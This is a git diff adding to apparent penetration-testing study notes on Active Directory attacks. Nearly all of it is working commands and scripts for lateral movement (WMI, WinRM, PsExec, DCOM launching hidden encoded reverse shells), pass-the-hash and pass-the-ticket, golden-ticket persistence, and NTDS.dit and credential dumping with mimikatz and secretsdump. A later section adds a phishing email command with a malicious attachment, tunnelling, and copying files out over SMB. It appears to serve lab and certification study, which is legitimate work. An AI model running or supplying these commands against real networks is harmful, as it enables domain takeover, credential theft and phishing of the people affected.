@@ -1015,17 +1015,14 @@ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/has
 
 ```
 
+**Lateral Movement in Active Directory:**
+1. WMI:                                      (admin on the remote machine or domain admin)
 ```
-Lateral Movement in Active Directory:
-
-1. WMI:
-
 wmic /node:<target-IP> /user:<domain-user> /password:<password> process call create "notepad.exe"
-
-executing arbitrary commands on a domain joined target:
-
 ```
-```# this is a basic script demonstrating AD lateral movement via WMI
+Executing arbitrary commands on a domain joined target:
+```
+# this is a basic script demonstrating AD lateral movement via WMI
 
 # creating the PSCredential object
 $username = 'jen'
@@ -1038,9 +1035,182 @@ $session = New-CimSession -ComputerName 192.168.180.72 -Credential $credential -
 $Command = 'type C:\\Users\\Administrator\\Desktop\\flag.txt';
 
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command}```
-
-
-
 ```
 
+2. WinRM:                                      (admin on the remote machine or domain admin)
 ```
+winrs -r:<target-hostname-or-IP> -u:<domain-user> -p:<password> "cmd /c hostname & whoami"
+```
+```
+winrs -r:<target-hostname-or-IP> -u:<domain-user> -p:<password> "powershell.exe -ep bypass -w hidden -NoP -e <encoded-reverse-shell>"
+```
+Establishing WinRM sessions via PowerShell:
+```
+# this is a basic script demonstrating AD lateral movement via WinRM
+
+# creating the PSCredential object
+$username = '<local-administrator-user>'
+$password = '<password>'
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;
+
+New-PSSession -ComputerName <victim-IP> -Credential $credential
+
+# Once this has executed, interact with created sessions using: Enter-PSSession <session-ID>
+#
+```
+
+3. PsExec:                                      (admin on the remote machine or domain admin)
+```
+.\PsExec64.exe -i \\<target-IP-or-hostname> -u <domain.local\username> -p <password> cmd
+```
+
+4. Pass the Hash (PtH):                (admin on the local machine)
+```
+impacket-wmiexec -hashes <LM>:<NT> Administrator@<target-IP>
+
+impacket-psexec -hashes <LM>:<NT> Administrator@<target-IP>
+
+impacket-smbexec -hashes <LM>:<NT> Administrator@<target-IP>
+```
+
+5. Overpass the Hash:                (admin on the local machine)
+	1. dump cached credentials >> PtH locally to get powershell as the target (local) user >> perform some kind of network auth to cache kerberos tickets >> use psexec64.exe in the powershell session with the cached tickets to move laterally
+```
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<NTHASH> /run:powershell
+klist
+net use \\DC01SRV.domain.local\C$           (this share needs to be accessible)
+klist
+.\PsExec64.exe \\192.168.44.34 cmd         (spawn a shell on target)
+```
+
+Overpass the Hash lab:
+```
+runas /user:Administrator /savecred powershell
+sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
+```
+
+6. Pass the Ticket:    
+	1. (Administrator on the local machine, unless the TGS belongs to current user)
+```
+privilege::debug
+sekurlsa::tickets /export       
+	(look for tickets that can be leveraged to gain new access)
+kerberos::ptt filename.kirbi
+klist
+ls \\172.16.77.55\C$
+pushd \\172.16.77.55\C$
+net use \\172.16.77.55\C$
+net use /delete \\172.16.77.55\C$
+```
+
+7. DCOM:                          (Administrator on the local and remote machine or domain admin)
+- executing commands on remote systems using DCOM through PowerShell:
+```
+# this basic script demonstrates lateral movement via DCOM
+# specifically, the MMC COM application's Application classe's Application Objects' Document.ActiveView.ExecuteShellCommand() method, which can be called by any local Administrator
+
+# create the application object
+$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.180.73"))
+
+# command, directory, parameters, window state
+
+# $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c notepad.exe","7")
+
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell.exe -ep bypass -w hidden -NoP -EncodedCommand <b64-encoded-reverse-shell>","7")
+```
+
+
+**Persistence in Active Directory**
+
+1. Golden Tickets                                 (krbtgt password or password hash)
+```
+whoami /user
+privilege::debug
+lsadump::lsa /patch
+kerberos::purge
+kerberos::golden /user:<valid-domain-username> /domain:domain.local /sid:<domain-SID> /krbtgt:<krbtgt-NT-hash> /ptt
+	/id:500 will give local Administrator if needed
+misc::cmd
+.\PsExec64.exe \\<DC-hostname> cmd.exe
+	- this HAS to be the DC-hostname, NOT the IP address
+```
+
+2. Golden Tickets from Linux:                (this has been very buggy during deployments)
+```
+impacket-secretsdump <domain-admin-user>:"Password1"@<DC-IP>
+impacket-lookupsid domain.local/<domain-admin-user>:"Password1"@<DC-IP>
+impacket-ticketer -nthash <NTHASH> -domain-sid "<domain-SID>" -domain domain.local Administrator
+export KRB5CCNAME=ticket.ccache
+impacket-psexec corp.com/Administrator@WEB1SRV.domain.local -k -no-pass -debug
+```
+
+3. Shadow Copies:                             (DC access, domain admin)
+```
+vshadow.exe -nw -p C:\
+	- create a shadow copy of C:\ on local disk
+	- take note of "Shadow copy device name"
+copy <shadow-copy-device-name\windows\ntds\ntds.dit> C:\ntds.dit.bak
+	- extract NTDS.dit from shadow copy
+reg.exe save hklm\system C:\system.bak
+impacket-secretsdump -ntds <ntds.dit.bak> -system <system.bak> LOCAL
+```
+
+**Lateral movement labs:**
+1. DCSync:
+```
+impacket-secretsdump -just-dc-user <target-admin> domain.local/<domain-user>:Password1@<DC-IP>
+
+hashcat -m 1000 hashes.dcsync <wordlist> -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+2.  Moving laterally with crackmapexec:
+```
+crackmapexec smb 192.168.197.70-76 -u leon -p Password1 -d corp.com --continue-on-success
+
+impacket-smbexec corp.com/leon:Password1@192.168.197.70
+```
+
+3. Passing the Hash to view SMB shares
+```
+sekurlsa::logonpasswords
+
+smbclient //192.168.197.72/backup -U dave --pw-nt-hash 08d7a47a6f9f66b97b1bae4178747494 -W corp.com
+
+net view \\WEB04
+```
+
+
+**Assembling the Pieces**
+```
+git status
+git log
+git show <commit-hash>
+
+wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o output.txt
+
+crackmapexec smb <target-IP> -u usernames.txt -p passwords.txt --continue-on-success
+
+crackmapexec smb <target-IP> -u john -p Password1 --shares
+
+sudo swaks -t marcus@beyond.com,daniela@beyond.com --from john@beyond.com --auth-user john@beyond.com --server 192.168.250.242 --body 'Please open the attached file promptly, as it is an urgent configuration change.' --attach @/home/kali/webdav/config.Library-ms --suppress-data -ap
+
+. .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All
+
+MATCH (m:Computer) RETURN m
+MATCH (m:User) RETURN m
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+
+sudo proxychains -q nmap -sT -oN scan.txt -Pn -p 21,80,443 <target-IP>
+
+./chisel server -p 8085 --reverse
+chisel.exe client 192.168.45.204:8080 9999:172.16.50.4:445
+
+impacket-smbserver -username test -password test -smb2support share .
+net use //192.168.45.204/share /u:test test
+copy test.txt \\192.168.45.204\share\test.txt
+net use /delete \\192.168.45.204\share
+```
+
